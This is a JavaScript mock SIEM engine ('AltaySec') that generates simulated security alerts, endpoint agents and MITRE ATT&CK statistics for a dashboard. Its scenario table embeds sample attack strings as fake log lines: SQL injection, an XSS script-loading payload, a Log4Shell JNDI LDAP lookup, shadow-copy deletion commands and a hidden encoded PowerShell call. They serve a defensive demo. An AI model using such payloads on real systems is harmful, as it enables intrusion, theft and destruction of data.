// ============================================================================
// AltaySec - Client-Side Mock SIEM Engine
// ----------------------------------------------------------------------------
// Bu dosya, Express backend'in tüm veri üretme ve filtreleme mantığını
// tarayıcı üzerinde (in-memory) simüle eder. Backend servisi çalışmadığında
// sistem otomatik olarak bu sınıfa geçiş yapar.
// ============================================================================

const MITRE_TECHNIQUES = {
  T1110: { name: "Brute Force", tactic: "Credential Access" },
  "T1110.001": { name: "Password Guessing", tactic: "Credential Access" },
  T1190: { name: "Exploit Public-Facing Application", tactic: "Initial Access" },
  T1210: { name: "Exploitation of Remote Services", tactic: "Lateral Movement" },
  T1059: { name: "Command and Scripting Interpreter", tactic: "Execution" },
  "T1059.001": { name: "PowerShell", tactic: "Execution" },
  T1486: { name: "Data Encrypted for Impact", tactic: "Impact" },
  T1490: { name: "Inhibit System Recovery", tactic: "Impact" },
  "T1021.004": { name: "Remote Services: SSH", tactic: "Lateral Movement" },
  T1078: { name: "Valid Accounts", tactic: "Persistence" },
  "T1071.001": { name: "Web Protocols (C2 Kanali)", tactic: "Command and Control" },
  T1003: { name: "OS Credential Dumping", tactic: "Credential Access" },
  "T1550.002": { name: "Pass the Hash", tactic: "Lateral Movement" },
  T1068: { name: "Exploitation for Privilege Escalation", tactic: "Privilege Escalation" },
  "T1566.001": { name: "Phishing: Spearphishing Attachment", tactic: "Initial Access" },
  "T1566.002": { name: "Phishing: Spearphishing Link", tactic: "Initial Access" },
  "T1562.001": { name: "Disable or Modify Tools", tactic: "Defense Evasion" },
  "T1565.001": { name: "Stored Data Manipulation", tactic: "Impact" },
  T1046: { name: "Network Service Discovery", tactic: "Discovery" },
  T1098: { name: "Account Manipulation", tactic: "Persistence" },
  T1595: { name: "Active Scanning", tactic: "Reconnaissance" },
};

let agents = [
  { id: "001", name: "WIN-DC01", ip: "10.0.0.10", os: "Windows Server 2022", group: "domain-controllers", version: "v4.8.0", status: "active" },
  { id: "002", name: "WIN-DC02", ip: "10.0.0.11", os: "Windows Server 2019", group: "domain-controllers", version: "v4.8.0", status: "active" },
  { id: "003", name: "WEB-SRV-01", ip: "10.0.1.20", os: "Ubuntu 22.04 LTS", group: "web-tier", version: "v4.8.0", status: "active" },
  { id: "004", name: "WEB-SRV-02", ip: "10.0.1.21", os: "Ubuntu 22.04 LTS", group: "web-tier", version: "v4.7.5", status: "active" },
  { id: "005", name: "DB-PRIMARY", ip: "10.0.2.30", os: "CentOS Stream 9", group: "database-tier", version: "v4.8.0", status: "active" },
  { id: "006", name: "DB-REPLICA", ip: "10.0.2.31", os: "CentOS Stream 9", group: "database-tier", version: "v4.8.0", status: "active" },
  { id: "007", name: "FIN-WORKSTATION-04", ip: "10.0.5.44", os: "Windows 11 Pro", group: "finance-dept", version: "v4.6.0", status: "active" },
  { id: "008", name: "HR-LAPTOP-12", ip: "10.0.5.62", os: "Windows 10 Pro", group: "hr-dept", version: "v4.6.0", status: "active" },
  { id: "009", name: "MAC-DEV-03", ip: "10.0.3.15", os: "macOS Sonoma 14.5", group: "dev-team", version: "v4.8.0", status: "active" },
  { id: "010", name: "LINUX-JUMPBOX", ip: "10.0.0.5", os: "Debian 12", group: "perimeter", version: "v4.8.0", status: "active" },
  { id: "011", name: "MAIL-GATEWAY", ip: "10.0.1.5", os: "Ubuntu 20.04 LTS", group: "perimeter", version: "v4.5.2", status: "never_connected" },
  { id: "012", name: "BACKUP-SRV-01", ip: "10.0.4.10", os: "Windows Server 2019", group: "infrastructure", version: "v4.8.0", status: "disconnected" },
  { id: "013", name: "POS-TERMINAL-07", ip: "10.0.6.71", os: "Windows 10 IoT", group: "retail-pos", version: "v4.4.1", status: "active" },
  { id: "014", name: "CICD-RUNNER-02", ip: "10.0.3.40", os: "Ubuntu 22.04 LTS", group: "dev-team", version: "v4.8.0", status: "active" },
];

// Initialize agents keep_alive
agents = agents.map((a) => ({
  ...a,
  last_keep_alive:
    a.status === "active"
      ? new Date(Date.now() - Math.floor(Math.random() * 60) * 1000).toISOString()
      : new Date(Date.now() - (3600000 + Math.floor(Math.random() * 9 * 3600000))).toISOString(),
  status_changed_at: new Date().toISOString(),
}));

function rnd(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function pickRandom(arr) {
  return arr[rnd(0, arr.length - 1)];
}

function randomExternalIp() {
  const blocks = [
    () => `185.${rnd(20, 250)}.${rnd(1, 254)}.${rnd(1, 254)}`,
    () => `45.${rnd(60, 200)}.${rnd(1, 254)}.${rnd(1, 254)}`,
    () => `103.${rnd(1, 250)}.${rnd(1, 254)}.${rnd(1, 254)}`,
    () => `91.${rnd(100, 240)}.${rnd(1, 254)}.${rnd(1, 254)}`,
    () => `203.${rnd(1, 250)}.${rnd(1, 254)}.${rnd(1, 254)}`,
    () => `62.${rnd(1, 250)}.${rnd(1, 254)}.${rnd(1, 254)}`,
    () => `194.${rnd(1, 250)}.${rnd(1, 254)}.${rnd(1, 254)}`,
  ];
  return pickRandom(blocks)();
}

function randomInternalIp() {
  const blocks = [
    () => `10.0.${rnd(0, 6)}.${rnd(2, 250)}`,
    () => `192.168.${rnd(1, 20)}.${rnd(2, 250)}`,
    () => `172.16.${rnd(0, 31)}.${rnd(2, 250)}`,
  ];
  return pickRandom(blocks)();
}

function portFor(serviceHint) {
  const table = {
    ssh: 22,
    http: 80,
    https: 443,
    smb: 445,
    rdp: 3389,
    smtp: 587,
    mysql: 3306,
    dns: 53,
    winrm: 5985,
  };
  return table[serviceHint] || rnd(1024, 65535);
}

let alertSequence = 1000;
function nextEventId() {
  alertSequence += 1;
  return `evt-${alertSequence}`;
}

const SCENARIOS = [
  {
    category: "SQL Enjeksiyonu",
    mitre: ["T1190"],
    levelRange: [9, 13],
    protocol: "tcp",
    service: "https",
    sourceScope: "external",
    groups: ["web", "accesslog", "attack", "sqlinjection"],
    describe: (c) =>
      `SQL Injection (SQLi) saldırısı tespit edildi: ${c.srcIp} adresinden ${c.agent.name} üzerindeki web uygulamasına, veritabanını hedef alan kötü amaçlı SQL deseni içeren istek gönderildi.`,
    rawLog: (c) =>
      `${c.agent.ip} - - [${c.dateStr}] "GET /products.php?id=1' UNION SELECT username,password FROM users-- - HTTP/1.1" 403 287 "-" "Mozilla/5.0" client=${c.srcIp}`,
  },
  {
    category: "Siteler Arası Betik Çalıştırma (XSS)",
    mitre: ["T1190"],
    levelRange: [6, 9],
    protocol: "tcp",
    service: "https",
    sourceScope: "external",
    groups: ["web", "attack", "xss"],
    describe: (c) =>
      `Cross-Site Scripting (XSS) denemesi: ${c.srcIp} adresinden ${c.agent.name} web sunucusuna yönelik istek parametresinde şüpheli <script> etiketi/JavaScript payload'i tespit edildi.`,
    rawLog: (c) =>
      `${c.agent.ip} - - [${c.dateStr}] "GET /search?q=<script>document.location='//${c.srcIp}/c.js'</script> HTTP/1.1" 200 1043 client=${c.srcIp}`,
  },
  {
    category: "Uzaktan Kod Çalıştırma (RCE)",
    mitre: ["T1210", "T1190"],
    levelRange: [12, 15],
    protocol: "tcp",
    service: "https",
    sourceScope: "external",
    groups: ["web", "attack", "rce", "exploit"],
    describe: (c) =>
      `KRİTİK: Uzaktan Kod Çalıştırma (RCE) girişimi: ${c.srcIp} adresi, ${c.agent.name} üzerinde bilinen bir zafiyeti (CVE) istismar ederek sunucu tarafında komut çalıştırmaya çalıştı.`,
    rawLog: (c) =>
      `[exploit] source=${c.srcIp} target=${c.agent.ip}:${c.destPort} payload="\${jndi:ldap://${c.srcIp}/Exploit}" detection=rce_attempt severity=critical`,
  },
  {
    category: "SSH Kaba Kuvvet Saldırısı",
    mitre: ["T1110", "T1110.001"],
    levelRange: [7, 12],
    protocol: "tcp",
    service: "ssh",
    sourceScope: "external",
    groups: ["syslog", "sshd", "authentication_failures"],
    describe: (c) =>
      `SSH servisine yönelik kaba kuvvet (brute force) saldırısı: ${c.srcIp} adresinden ${c.agent.name} üzerinde kısa sürede çoklu başarısız oturum açma denemesi tespit edildi.`,
    rawLog: (c) =>
      `${c.dateStr} ${c.agent.name.toLowerCase()} sshd[${rnd(1000, 32000)}]: Failed password for invalid user admin from ${c.srcIp} port ${c.srcPort} ssh2`,
  },
  {
    category: "SSH Kaba Kuvvet Saldırısı",
    mitre: ["T1110", "T1078"],
    levelRange: [12, 15],
    protocol: "tcp",
    service: "ssh",
    sourceScope: "external",
    groups: ["syslog", "sshd", "authentication_success", "compromise"],
    describe: (c) =>
      `KRİTİK: ${c.srcIp} kaynağından ${c.agent.name} sunucusuna yönelik brute force saldırısı sonrası BAŞARILI kimlik doğrulama tespit edildi - hesap ele geçirilmiş olabilir.`,
    rawLog: (c) =>
      `${c.dateStr} ${c.agent.name.toLowerCase()} sshd[${rnd(1000, 32000)}]: Accepted password for root from ${c.srcIp} port ${c.srcPort} ssh2`,
  },
  {
    category: "Fidye Yazılımı",
    mitre: ["T1486", "T1490"],
    levelRange: [13, 15],
    protocol: "n/a",
    service: null,
    sourceScope: "internal",
    groups: ["ossec", "syscheck", "ransomware", "impact"],
    describe: (c) =>
      `KRİTİK FİDYE YAZILIMI GÖSTERGESİ: ${c.agent.name} üzerinde kısa sürede yüzlerce dosyanın yeniden adlandırıldığı ve şifrelendiği tespit edildi (toplu dosya değişikliği paterni).`,
    rawLog: (c) =>
      `syscheck: process=${pickRandom(["svchost.exe", "explorer32.exe", "update_helper.exe"])} pid=${rnd(2000, 9000)} action=mass_file_rename ext_added=.locked count=${rnd(180, 940)} host=${c.agent.name}`,
  },
  {
    category: "Fidye Yazılımı",
    mitre: ["T1490"],
    levelRange: [11, 14],
    protocol: "n/a",
    service: null,
    sourceScope: "internal",
    groups: ["ossec", "rootcheck", "ransomware", "defense_evasion"],
    describe: (c) =>
      `Sistem kurtarma mekanizması manipülasyonu: ${c.agent.name} üzerinde Gölge Kopya (Shadow Copy) silindi/devre dışı bırakıldı. Fidye yazılımı öncesi hazırlık davranışı olabilir.`,
    rawLog: (c) =>
      `cmd.exe /c vssadmin.exe delete shadows /all /quiet & wmic.exe shadowcopy delete host=${c.agent.name} pid=${rnd(2000, 9000)}`,
  },
  {
    category: "Hash Çalma Saldırısı (Pass-the-Hash)",
    mitre: ["T1550.002"],
    levelRange: [10, 13],
    protocol: "tcp",
    service: "smb",
    sourceScope: "internal",
    groups: ["windows", "authentication_success", "lateral_movement"],
    describe: (c) =>
      `Pass-the-Hash saldırısı şüphesi: ${c.srcIp} kaynağından, parola yerine çalınmış NTLM hash kullanılarak ${c.agent.name} üzerinde kimlik doğrulama yapıldı (yanal hareket göstergesi).`,
    rawLog: (c) =>
      `Microsoft-Windows-Security-Auditing: EventID=4624 LogonType=3 AuthenticationPackage=NTLM SourceAddress=${c.srcIp} TargetServer=${c.agent.name} Status=0x0`,
  },
  {
    category: "Yetki Yükseltme",
    mitre: ["T1068"],
    levelRange: [11, 14],
    protocol: "n/a",
    service: null,
    sourceScope: "internal",
    groups: ["windows", "privilege_escalation", "exploit"],
    describe: (c) =>
      `Yetki yükseltme istismarı: ${c.agent.name} üzerinde düşük yetkili bir sürecin, bilinen bir çekirdek/servis zafiyetini kullanarak SYSTEM yetkisine yükseldiği tespit edildi.`,
    rawLog: (c) =>
      `audit: exploit_attempt process=${pickRandom(["winlogon.exe", "spoolsv.exe", "rpcss.dll"])} cve=${pickRandom(["CVE-2023-21768", "CVE-2022-26134", "CVE-2024-21412"])} result=privilege_escalated host=${c.agent.name}`,
  },
  {
    category: "Oltalama Göstergeleri (Phishing)",
    mitre: ["T1566.001", "T1566.002"],
    levelRange: [6, 10],
    protocol: "tcp",
    service: "smtp",
    sourceScope: "external",
    groups: ["email", "phishing", "initial_access"],
    describe: (c) =>
      `Oltalama (phishing) göstergesi: ${c.agent.name} kullanıcısına, ${c.srcIp} kaynaklı şüpheli ekli dosya/link içeren ve bilinen oltalama imzalarına uyan bir e-posta teslim edildi.`,
    rawLog: (c) =>
      `postfix/smtpd[${rnd(1000, 9000)}]: NOQUEUE: reject: RCPT from unknown[${c.srcIp}]: 550 5.7.1 Message blocked - phishing_signature_match subject="Invoice_Urgent_${rnd(100, 999)}.docm"`,
  },
  {
    category: "Şüpheli PowerShell Çalıştırma",
    mitre: ["T1059.001", "T1562.001"],
    levelRange: [10, 14],
    protocol: "n/a",
    service: null,
    sourceScope: "internal",
    groups: ["windows", "powershell", "execution", "defense_evasion"],
    describe: (c) =>
      `Şüpheli PowerShell çalıştırma zinciri: ${c.agent.name} üzerinde gizlenmiş (obfuscated/base64) komut satırı argümanları ve güvenlik araçlarını devre dışı bırakma girişimi tespit edildi.`,
    rawLog: (c) =>
      `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SUVYIChOZXctT2JqZWN0IE5ldC5X... host=${c.agent.name}`,
  },
  {
    category: "Kimlik Bilgisi Dump Saldırısı",
    mitre: ["T1003"],
    levelRange: [9, 12],
    protocol: "n/a",
    service: null,
    sourceScope: "internal",
    groups: ["windows", "mitre", "credential_access"],
    describe: (c) =>
      `Kimlik bilgisi dump aracı imzası: ${c.agent.name} üzerinde bellekten parola/hash çıkarmaya yönelik bilinen bir araç (örn. Mimikatz benzeri) imzası tespit edildi.`,
    rawLog: (c) =>
      `sysmon: EventID=10 SourceImage=${pickRandom(["taskmgr.exe", "procdump.exe", "rundll32.exe"])} TargetImage=lsass.exe GrantedAccess=0x1410 host=${c.agent.name}`,
  },
  {
    category: "Dosya Bütünlüğü İhlali",
    mitre: ["T1565.001"],
    levelRange: [6, 9],
    protocol: "n/a",
    service: null,
    sourceScope: "internal",
    groups: ["ossec", "syscheck", "fim", "integrity_monitoring"],
    describe: (c) =>
      `Dosya Bütünlüğü İzleme (FIM) uyarısı: ${c.agent.name} üzerinde kritik sistem dizininde yetkisiz dosya değişikliği/manipülasyonu tespit edildi.`,
    rawLog: (c) =>
      `syscheck: integrity_checksum_changed file="/etc/passwd" old_md5=${rnd(100000, 999999)} new_md5=${rnd(100000, 999999)} host=${c.agent.name}`,
  },
  {
    category: "Hesap Yönetimi Anomali",
    mitre: ["T1098", "T1078"],
    levelRange: [7, 10],
    protocol: "n/a",
    service: null,
    sourceScope: "internal",
    groups: ["windows", "ad", "account_management"],
    describe: (c) =>
      `Yetki yükseltme şüpheli: ${c.agent.name} üzerinde standart bir kullanıcı hesabı, ${c.srcIp} kaynaklı oturumdan Administrators/Domain Admins grubuna eklendi.`,
    rawLog: (c) =>
      `Microsoft-Windows-Security-Auditing: EventID=4728 Group="Domain Admins" Member="user_${rnd(100, 999)}" SourceAddress=${c.srcIp} host=${c.agent.name}`,
  },
  {
    category: "Aktif Tarama ve Keşif",
    mitre: ["T1595", "T1046"],
    levelRange: [3, 6],
    protocol: "tcp",
    service: null,
    sourceScope: "mixed",
    groups: ["recon", "firewall", "scan"],
    describe: (c) =>
      `Port taraması / aktif keşif tespit edildi: ${c.srcIp} adresi, ${c.agent.name} üzerinde kısa sürede çoklu porta (${c.destPort} dahil) bağlantı denemesi yaptı.`,
    rawLog: (c) =>
      `iptables: IN=eth0 SRC=${c.srcIp} DST=${c.agent.ip} PROTO=TCP SPT=${c.srcPort} DPT=${c.destPort} FLAGS=SYN action=scan_detected`,
  },
  {
    category: "C2 Sinyalleşmesi (Beaconing)",
    mitre: ["T1071.001"],
    levelRange: [9, 12],
    protocol: "tcp",
    service: "https",
    sourceScope: "mixed",
    groups: ["firewall", "network", "c2", "command_and_control"],
    describe: (c) =>
      `Olağandışı giden trafik: ${c.agent.name} üzerinden bilinen kötü amaçlı IP listesindeki ${c.srcIp} adresine düzenli aralıklarla "beacon" benzeri trafik gönderildi (olası C2 kanalı).`,
    rawLog: (c) =>
      `firewall: ALLOW OUT proto=TCP src=${c.agent.ip} dst=${c.srcIp}:${c.destPort} bytes_out=${rnd(200, 900)} interval_sec=${rnd(55, 65)} pattern=periodic_beacon`,
  },
];

function generateAlert() {
  const scenario = pickRandom(SCENARIOS);
  const activeAgents = agents.filter((a) => a.status === "active");
  const targetAgent = activeAgents[rnd(0, activeAgents.length - 1)] || agents[0];

  let srcIp;
  if (scenario.sourceScope === "internal") {
    srcIp = randomInternalIp();
  } else if (scenario.sourceScope === "external") {
    srcIp = randomExternalIp();
  } else {
    srcIp = Math.random() < 0.5 ? randomExternalIp() : randomInternalIp();
  }

  const mitreId = pickRandom(scenario.mitre);
  const mitreInfo = MITRE_TECHNIQUES[mitreId];
  const [minLevel, maxLevel] = scenario.levelRange;
  const level = rnd(minLevel, maxLevel);

  const srcPort = rnd(1024, 65000);
  const destPort = scenario.service ? portFor(scenario.service) : rnd(1, 65000);

  const timestamp = new Date();
  const ctx = {
    agent: targetAgent,
    srcIp,
    srcPort,
    destPort,
    dateStr: timestamp.toUTCString(),
  };

  const ruleId = 80000 + rnd(0, 19999);
  const description = scenario.describe(ctx);

  return {
    id: nextEventId(),
    timestamp: timestamp.toISOString(),
    category: scenario.category,
    agent: targetAgent.name,
    agent_id: targetAgent.id,
    rule_id: ruleId,
    level,
    description,
    mitre_technique: { id: mitreId, name: mitreInfo.name, tactic: mitreInfo.tactic },
    src_ip: srcIp,
    agent_ip: targetAgent.ip,
    dest_ip: targetAgent.ip,
    src_port: srcPort,
    dest_port: destPort,
    protocol: scenario.protocol,
    rule: {
      id: ruleId,
      level,
      description,
      groups: scenario.groups,
    },
    full_log: scenario.rawLog(ctx),
    decoder: { name: scenario.groups[0] || "generic" },
    location: scenario.protocol === "n/a" ? `${targetAgent.name}->local` : `${targetAgent.name}->network`,
  };
}

let alerts = [];

function seedInitialAlerts() {
  const now = Date.now();
  for (let i = 60; i >= 0; i--) {
    const alert = generateAlert();
    alert.timestamp = new Date(now - i * 120000 - rnd(0, 60000)).toISOString();
    alerts.push(alert);
  }
  alerts.reverse();
}

// Initial seeding
seedInitialAlerts();

// Background alert generation loop in browser
setInterval(() => {
  const newAlert = generateAlert();
  alerts.unshift(newAlert);
  if (alerts.length > 500) {
    alerts = alerts.slice(0, 500);
  }
}, 3000);

// Background agent status changes loop
setInterval(() => {
  const evaluationCount = rnd(1, 2);
  for (let i = 0; i < evaluationCount; i++) {
    const candidate = agents[rnd(0, agents.length - 1)];
    if (candidate.status === "active" && Math.random() < 0.18) {
      candidate.status = "disconnected";
      candidate.status_changed_at = new Date().toISOString();
    } else if (candidate.status === "disconnected" && Math.random() < 0.55) {
      candidate.status = "active";
      candidate.last_keep_alive = new Date().toISOString();
      candidate.status_changed_at = new Date().toISOString();
    } else if (candidate.status === "never_connected" && Math.random() < 0.08) {
      candidate.status = "active";
      candidate.last_keep_alive = new Date().toISOString();
      candidate.status_changed_at = new Date().toISOString();
    }
  }
}, 10000);

// Emulate endpoints
export function getAgents() {
  return {
    total: agents.length,
    agents: agents.map((a) => ({ ...a })),
  };
}

export function getAlerts({ limit = 100, level, category, search, mitre, agent_ip } = {}) {
  let result = alerts;

  if (level) {
    const minLevel = parseInt(level, 10);
    if (!Number.isNaN(minLevel)) {
      result = result.filter((a) => a.level >= minLevel);
    }
  }

  if (category && category !== "all") {
    result = result.filter((a) => a.category === category);
  }

  if (mitre) {
    const mitreTerm = String(mitre).toLowerCase();
    result = result.filter((a) => a.mitre_technique.id.toLowerCase().includes(mitreTerm));
  }

  if (agent_ip) {
    const ipTerm = String(agent_ip).toLowerCase();
    result = result.filter((a) => a.agent_ip.toLowerCase().includes(ipTerm));
  }

  if (search) {
    const term = String(search).toLowerCase();
    result = result.filter(
      (a) =>
        a.agent.toLowerCase().includes(term) ||
        a.src_ip.toLowerCase().includes(term) ||
        a.dest_ip.toLowerCase().includes(term) ||
        a.agent_ip.toLowerCase().includes(term) ||
        a.description.toLowerCase().includes(term) ||
        String(a.rule_id).includes(term) ||
        String(a.level).includes(term) ||
        a.mitre_technique.id.toLowerCase().includes(term)
    );
  }

  const parsedLimit = parseInt(limit, 10) || 100;
  return {
    total: result.length,
    alerts: result.slice(0, parsedLimit),
  };
}

export function getAlertsCategories() {
  const categories = [...new Set(SCENARIOS.map((s) => s.category))];
  return { categories };
}

export function getAlert(id) {
  const alert = alerts.find((a) => a.id === id);
  if (!alert) return null;
  return { alert };
}

export function getStats() {
  const activeAgents = agents.filter((a) => a.status === "active").length;
  const disconnectedAgents = agents.filter((a) => a.status === "disconnected").length;
  const neverConnectedAgents = agents.filter((a) => a.status === "never_connected").length;

  const critical = alerts.filter((a) => a.level >= 12).length;
  const high = alerts.filter((a) => a.level >= 8 && a.level <= 11).length;
  const medium = alerts.filter((a) => a.level >= 4 && a.level <= 7).length;
  const low = alerts.filter((a) => a.level <= 3).length;

  const categoryCounts = {};
  alerts.forEach((a) => {
    categoryCounts[a.category] = (categoryCounts[a.category] || 0) + 1;
  });

  const mitreCounts = {};
  alerts.forEach((a) => {
    const key = a.mitre_technique.id;
    if (!mitreCounts[key]) {
      mitreCounts[key] = { id: key, name: a.mitre_technique.name, tactic: a.mitre_technique.tactic, count: 0 };
    }
    mitreCounts[key].count += 1;
  });
  const topMitreTechniques = Object.values(mitreCounts)
    .sort((a, b) => b.count - a.count)
    .slice(0, 6);

  const BUCKET_COUNT = 10;
  const BUCKET_MINUTES = 12;
  const now = Date.now();
  const buckets = Array.from({ length: BUCKET_COUNT }, (_, i) => {
    const bucketStart = now - (BUCKET_COUNT - i) * BUCKET_MINUTES * 60000;
    return {
      time: new Date(bucketStart).toLocaleTimeString("tr-TR", { hour: "2-digit", minute: "2-digit" }),
      total: 0,
      critical: 0,
      high: 0,
    };
  });

  alerts.forEach((a) => {
    const alertTime = new Date(a.timestamp).getTime();
    const diffMinutes = (now - alertTime) / 60000;
    const bucketIndexFromEnd = Math.floor(diffMinutes / BUCKET_MINUTES);
    const bucketIndex = BUCKET_COUNT - 1 - bucketIndexFromEnd;
    if (bucketIndex >= 0 && bucketIndex < BUCKET_COUNT) {
      buckets[bucketIndex].total += 1;
      if (a.level >= 12) buckets[bucketIndex].critical += 1;
      else if (a.level >= 8) buckets[bucketIndex].high += 1;
    }
  });

  return {
    generatedAt: new Date().toISOString(),
    agents: {
      total: agents.length,
      active: activeAgents,
      disconnected: disconnectedAgents,
      neverConnected: neverConnectedAgents,
    },
    alerts: {
      total: alerts.length,
      critical,
      high,
      medium,
      low,
    },
    severityDistribution: [
      { name: "Kritik", value: critical },
      { name: "Yüksek", value: high },
      { name: "Orta", value: medium },
      { name: "Düşük", value: low },
    ],
    categoryDistribution: Object.entries(categoryCounts).map(([name, value]) => ({ name, value })),
    topMitreTechniques,
    timeline: buckets,
  };
}
